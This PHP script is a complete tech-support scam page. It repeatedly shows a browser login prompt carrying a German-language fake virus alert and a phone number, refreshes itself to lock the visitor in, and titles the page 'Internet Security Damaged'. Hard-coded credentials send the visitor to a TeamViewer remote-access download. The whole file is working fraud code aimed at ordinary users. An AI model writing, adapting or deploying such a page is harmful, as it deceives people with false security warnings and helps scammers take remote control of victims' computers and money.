<?php

    session_start();

    $_user = 'windows2018';
    $_password = 'microsoft1';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: auth.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Verdächtige Aktivitäten auf Ihrer IP-Adresse aufgrund schädlicher Viren auf Ihrem Computer erkannt. Rufen Sie jetzt gebührenfrei +43-670-3080-200 für jede Hilfe. "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: auth.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
